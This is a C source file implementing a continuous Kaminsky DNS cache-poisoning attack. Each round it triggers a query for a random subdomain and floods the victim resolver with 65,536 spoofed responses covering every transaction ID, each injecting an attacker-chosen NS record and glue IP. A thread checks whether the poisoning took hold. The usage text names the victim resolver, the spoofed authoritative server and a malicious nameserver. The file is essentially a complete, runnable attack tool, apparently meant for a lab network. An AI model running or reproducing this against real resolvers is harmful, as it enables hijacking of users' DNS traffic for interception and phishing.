// ======== kaminsky_attack.c ========
/*
    A continuous Kaminsky attack implementation using the sender framework's
    multi-task strategy. This tool repeatedly triggers queries for new random
    subdomains and submits corresponding packet-flooding tasks to the sender,
    creating a sustained cache poisoning attempt.
*/

#include <pthread.h>
#include <time.h>
#include <unistd.h>
#include "util.h"
#include "network.h"
#include "dns.h"
#include "sender.h"
#include "strategy.h"
#include "common.h"
#include "parser.h"

#define ATTACK_INTERVAL_MS 1500 // attack every 1.5s
#define VERIFY_INTERVAL_S 3


volatile bool g_stop_verify_thread = false;

typedef struct {
    sender_t* sender;           // sender hanle to stop
    char* victim_ip;            // VICTIM IP
    char* verify_domain;        // POISON NS
    char* expected_ip;          // EXPECTED IP
} verify_context_t;


/**
 * @brief Verify Thread
 */
static void* verify_poison_thread(void* args) {
    verify_context_t* ctx = (verify_context_t*)args;
    printf("[Verify] Verification thread started. Checking for domain '%s' -> IP '%s'\n",
           ctx->verify_domain, ctx->expected_ip);

    while (!g_stop_verify_thread) {
        sleep(VERIFY_INTERVAL_S);
        if (g_stop_verify_thread) break;

        printf("[Verify] Running check...\n");

        int sockfd = make_sockfd_for_dns(2); // 2s timeout
        if (sockfd < 0) {
            perror("[Verify] Failed to create socket for verification");
            continue;
        }

        // 1. 发送查询请求
        struct dns_query* query[1];
        query[0] = new_dns_query_a(ctx->verify_domain);
        send_dns_req(sockfd, ctx->victim_ip, 53, query, 1);
        free_dns_query(query[0]);

        // 2. 接收并解析响应
        uint8_t buffer[1024];
        ssize_t n = recvfrom(sockfd, buffer, sizeof(buffer), 0, NULL, NULL);
        close(sockfd);

        if (n <= 0) {
            printf("[Verify] No response or error from victim resolver.\n");
            continue;
        }

        parsed_dns_packet_t dns_packet;
        if (!unpack_dns_packet(buffer, n, &dns_packet)) {
            fprintf(stderr, "[Verify] Failed to parse DNS response.\n");
            continue;
        }

        // 3. 检查Answer Section
        bool success = false;
        for (dns_parsed_rr_t* rr = dns_packet.answers; rr; rr = rr->next) {
            // 我们只关心A记录
            if (rr->rtype == RR_TYPE_A) {
                char ip_str[INET_ADDRSTRLEN];
                // 将rdata中的二进制IP转换为字符串
                inet_ntop(AF_INET, rr->rdata, ip_str, INET_ADDRSTRLEN);

                if (strcmp(ip_str, ctx->expected_ip) == 0) {
                    success = true;
                    printf("\n\n======================================================\n");
                    printf("  [SUCCESS] CACHE POISONING VERIFIED!\n");
                    printf("  >> Victim resolver now maps '%s' to '%s'\n", ctx->verify_domain, ip_str);
                    printf("======================================================\n\n");
                    break;
                }
            }
        }

        free_parsed_dns_packet(&dns_packet);

        if (success) {
            printf("[Verify] Sending stop signal to main loop...\n");
            uv_async_send(ctx->sender->stop_async);
            break;
        } else {
            printf("[Verify] Check complete. Poisoning not yet successful.\n");
        }
    }

    printf("[Verify] Verification thread exiting.\n");
    free(ctx->victim_ip);
    free(ctx->verify_domain);
    free(ctx->expected_ip);
    free(ctx);
    return NULL;
}


// Struct to hold arguments for the packet creation worker
typedef struct {
    char* auth_ip;
    char* victim_ip;
    uint16_t victim_port;
    char* random_domain;
    char* target_domain;
    char* poison_ns_name;
    char* poison_ns_ip;
} make_spoof_args_t;

// Struct to hold arguments for the query trigger thread
typedef struct {
    char* victim_ip;
    char* random_domain;
} trigger_args_t;

// Context for the main attack timer, holding all necessary info
typedef struct {
    sender_t* sender;
    const char* victim_ip;
    uint16_t victim_port;
    const char* auth_ip;
    const char* target_domain;
    const char* poison_ns_name;
    const char* poison_ns_ip;
    uint64_t round_counter;
} attack_context_t;


/**
 * @brief Frees the memory allocated for make_spoof_args_t.
 * This is crucial for the multitask strategy to clean up after each task.
 */
static void free_make_spoof_args(void* args) {
    if (!args) return;
    make_spoof_args_t* s_args = (make_spoof_args_t*)args;
    free(s_args->auth_ip);
    free(s_args->victim_ip);
    free(s_args->random_domain);
    free(s_args->target_domain);
    free(s_args->poison_ns_name);
    free(s_args->poison_ns_ip);
    free(s_args);
}

/**
 * @brief The core packet generation function, used by each multitask work item.
 * It creates 65536 spoofed DNS responses for a specific random domain.
 */
bool make_kaminsky_packets(Arena* arena, packet_queue_t* queue, void* args) {
    make_spoof_args_t* s_args = (make_spoof_args_t*)args;

    // 1. Construct the DNS payload template
    struct dns_query* query[1];
    struct dns_answer* authori[1];
    struct dns_answer* additional[1];

    query[0] = new_dns_query_a(s_args->random_domain);
    authori[0] = new_dns_answer_ns(s_args->target_domain, s_args->poison_ns_name, RES_TTL);
    additional[0] = new_dns_answer_a(s_args->poison_ns_name, inet_addr(s_args->poison_ns_ip), RES_TTL);

    uint8_t* dns_payload = (uint8_t*)alloc_memory(DNS_PKT_MAX_LEN);
    size_t dns_payload_len = make_dns_packet(dns_payload, DNS_PKT_MAX_LEN, TRUE, 0, 
                                     query, 1,           // 1 Question
                                     NULL, 0,            // 0 Answers
                                     authori, 1,         // 1 Authority RR
                                     additional, 1,      // 1 Additional RR
                                     FALSE);

    uint8_t* packet_template = (uint8_t*)arena_alloc(arena, DNS_PKT_MAX_LEN);
    size_t packet_raw_len = make_udp_packet(packet_template, DNS_PKT_MAX_LEN,
                                            inet_addr(s_args->auth_ip),
                                            inet_addr(s_args->victim_ip),
                                            53, 
                                            s_args->victim_port,
                                            dns_payload, dns_payload_len);
    
    free(dns_payload);
    free_dns_query(query[0]);
    free_dns_answer(authori[0]);
    free_dns_answer(additional[0]);

    if (packet_raw_len == 0) {
        fprintf(stderr, "[-] Failed to create packet template.\n");
        free(packet_template);
        return false;
    }

    struct sockaddr_in dest_addr_template;
    memset(&dest_addr_template, 0, sizeof(dest_addr_template));
    dest_addr_template.sin_family = AF_INET;
    dest_addr_template.sin_addr.s_addr = inet_addr(s_args->victim_ip);
    dest_addr_template.sin_port = htons(s_args->victim_port);

    // 2. Generate 65536 packets, each with a different TXID
    for (uint32_t i = 0; i <= UINT16_MAX; i++) {
        packet_t* new_pkt = (packet_t*)arena_alloc(arena, sizeof(packet_t));
        new_pkt->data = (uint8_t*)arena_alloc(arena, packet_raw_len);
        new_pkt->size = packet_raw_len;
        new_pkt->next = NULL;
        memcpy(&new_pkt->dest_addr, &dest_addr_template, sizeof(dest_addr_template));
        memcpy(new_pkt->data, packet_template, packet_raw_len);
        struct dnshdr* dnsh = (struct dnshdr*)(new_pkt->data + sizeof(struct iphdr) + sizeof(struct udphdr));
        dnsh->id = htons((uint16_t)i);
        
        if (queue->head == NULL) { queue->head = new_pkt; queue->tail = new_pkt; } 
        else { queue->tail->next = new_pkt; queue->tail = new_pkt; }
    }
    return true;
}

/**
 * @brief Thread function to send the initial query that triggers the attack window.
 */
static void* trigger_query_thread(void* args) {
    trigger_args_t* t_args = (trigger_args_t*)args;
    send_dns_query(t_args->victim_ip, t_args->random_domain, 2);
    free(t_args->random_domain);
    free(t_args->victim_ip);
    free(t_args);
    return NULL;
}

/**
 * @brief The main timer callback that orchestrates each round of the attack.
 */
static void attack_timer_cb(uv_timer_t* handle) {
    attack_context_t* ctx = (attack_context_t*)handle->data;
    ctx->round_counter++;

    char random_subdomain[25];
    snprintf(random_subdomain, sizeof(random_subdomain), "r%llu-%lx", 
             (unsigned long long)ctx->round_counter, (unsigned long)time(NULL));
    char* random_domain = (char*)alloc_memory(strlen(ctx->target_domain) + strlen(random_subdomain) + 2);
    sprintf(random_domain, "%s.%s", random_subdomain, ctx->target_domain);

    printf("\n--- Attack Round %llu ---\n", (unsigned long long)ctx->round_counter);
    printf("[+] Triggering query for: %s\n", random_domain);

    pthread_t query_thread;
    trigger_args_t* t_args = (trigger_args_t*)alloc_memory(sizeof(trigger_args_t));
    t_args->victim_ip = _strdup(ctx->victim_ip);
    t_args->random_domain = _strdup(random_domain);
    pthread_create(&query_thread, NULL, trigger_query_thread, t_args);
    pthread_detach(query_thread);

    make_spoof_args_t* s_args = (make_spoof_args_t*)alloc_memory(sizeof(make_spoof_args_t));
    s_args->auth_ip = _strdup(ctx->auth_ip);
    s_args->victim_ip = _strdup(ctx->victim_ip);
    s_args->victim_port = ctx->victim_port;
    s_args->random_domain = _strdup(random_domain);
    s_args->target_domain = _strdup(ctx->target_domain);
    s_args->poison_ns_name = _strdup(ctx->poison_ns_name);
    s_args->poison_ns_ip = _strdup(ctx->poison_ns_ip);

    printf("[+] Submitting packet flood task to sender...\n");
    int ret = multitask_submit_work(ctx->sender, make_kaminsky_packets, s_args, free_make_spoof_args);
    if (ret != 0) {
        fprintf(stderr, "[-] Failed to submit work to multitask strategy!\n");
        free_make_spoof_args(s_args);
    }
    
    free(random_domain);
}

/**
 * @brief Signal handler for graceful shutdown.
 */
static void on_signal(uv_signal_t* handle, int signum) {
    sender_t* sender = (sender_t*)handle->data;
    printf("\n[Signal] Caught signal %d. Shutting down...\n", signum);
    uv_async_send(sender->stop_async);
    uv_signal_stop(handle);
}

/**
 * @brief Prints the usage information for the program.
 */
static void print_usage(const char* prog_name) {
    fprintf(stderr, "Usage: %s [options]\n", prog_name);
    fprintf(stderr, "Options:\n");
    fprintf(stderr, "  -t <ip>      IP address of the victim recursive resolver (Required)\n");
    fprintf(stderr, "  -p <port>    Source port used by the victim resolver to guess (Required)\n");
    fprintf(stderr, "  -s <ip>      IP address of the real authoritative server (to be spoofed) (Required)\n");
    fprintf(stderr, "  -d <domain>  The domain to poison (e.g., example.com) (Required)\n");
    fprintf(stderr, "  -n <ns_name> The malicious NS server name to inject (e.g., ns.attacker.com) (Required)\n");
    fprintf(stderr, "  -i <ns_ip>   The IP for the malicious NS (glue record) (Required)\n");
    fprintf(stderr, "  -h           Print this help message\n\n");
    fprintf(stderr, "Example: %s -t 10.10.0.6 -p 34567 -s 10.10.0.8 -d example.com -n ns.attacker.com -i 10.10.0.7\n", prog_name);
}

int main(int argc, char** argv) {
    // --- 参数解析变量 ---
    char* victim_ip = NULL;
    uint16_t victim_port = 0;
    char* auth_ip = NULL;
    char* target_domain = NULL;
    char* poison_ns_name = NULL;
    char* poison_ns_ip = NULL;
    int ch;

    // --- 使用 getopt 循环解析参数 ---
    while ((ch = getopt(argc, argv, "t:p:s:d:n:i:h")) != -1) {
        switch (ch) {
            case 't': victim_ip = optarg; break;
            case 'p': victim_port = atoi(optarg); break;
            case 's': auth_ip = optarg; break;
            case 'd': target_domain = optarg; break;
            case 'n': poison_ns_name = optarg; break;
            case 'i': poison_ns_ip = optarg; break;
            case 'h': print_usage(argv[0]); return 0;
            case '?': default: print_usage(argv[0]); return 1;
        }
    }

    // --- 验证所有必需参数是否都已提供 ---
    if (!victim_ip || victim_port == 0 || !auth_ip || !target_domain || !poison_ns_name || !poison_ns_ip) {
        fprintf(stderr, "Error: All options (-t, -p, -s, -d, -n, -i) are required.\n\n");
        print_usage(argv[0]);
        return 1;
    }

    dns_init();
    uv_loop_t* loop = uv_default_loop();

    sender_t my_sender;
    if (sender_init(&my_sender, loop, "0.0.0.0", 0) != 0) {
        fprintf(stderr, "Failed to initialize sender\n");
        return 1;
    }
    printf("[+] Sender framework initialized.\n");

    sender_strategy_t* strategy = create_strategy_multitask(NULL, NULL, NULL, 10);
    sender_set_strategy(&my_sender, strategy);
    printf("[+] Multitask strategy set.\n");
    
    attack_context_t context = {
        .sender = &my_sender,
        .victim_ip = victim_ip,
        .victim_port = victim_port,
        .auth_ip = auth_ip,
        .target_domain = target_domain,
        .poison_ns_name = poison_ns_name,
        .poison_ns_ip = poison_ns_ip,
        .round_counter = 0
    };

    pthread_t verify_thread;
    verify_context_t* v_ctx = (verify_context_t*)alloc_memory(sizeof(verify_context_t));
    v_ctx->sender = &my_sender;
    v_ctx->victim_ip = _strdup(victim_ip);
    v_ctx->verify_domain = _strdup(poison_ns_name); // POISON_NS
    v_ctx->expected_ip = _strdup(poison_ns_ip);     // POISON_IP

    if (pthread_create(&verify_thread, NULL, verify_poison_thread, v_ctx) != 0) {
        perror("Failed to create verification thread");
        free(v_ctx->victim_ip);
        free(v_ctx->verify_domain);
        free(v_ctx->expected_ip);
        free(v_ctx);
        sender_free(&my_sender);
        uv_loop_close(loop);
        return 1;
    }

    uv_timer_t attack_timer;
    uv_timer_init(loop, &attack_timer);
    attack_timer.data = &context;
    uv_timer_start(&attack_timer, attack_timer_cb, 0, ATTACK_INTERVAL_MS);
    
    uv_signal_t signal_handle;
    uv_signal_init(loop, &signal_handle);
    signal_handle.data = &my_sender;
    uv_signal_start(&signal_handle, on_signal, SIGINT);
    
    sender_start(&my_sender);
    
    printf("[+] Attack loop started. Running event loop. Press Ctrl+C to stop.\n");
    uv_run(loop, UV_RUN_DEFAULT);
    
    printf("[+] Event loop stopped. Cleaning up...\n");
    uv_timer_stop(&attack_timer);

    g_stop_verify_thread = true;
    printf("[+] Waiting for verification thread to join...\n");
    pthread_join(verify_thread, NULL);
    printf("[+] Verification thread joined.\n");

    sender_free(&my_sender);
    uv_run(loop, UV_RUN_ONCE);
    uv_loop_close(loop);

    printf("[+] Finished.\n");
    return 0;
}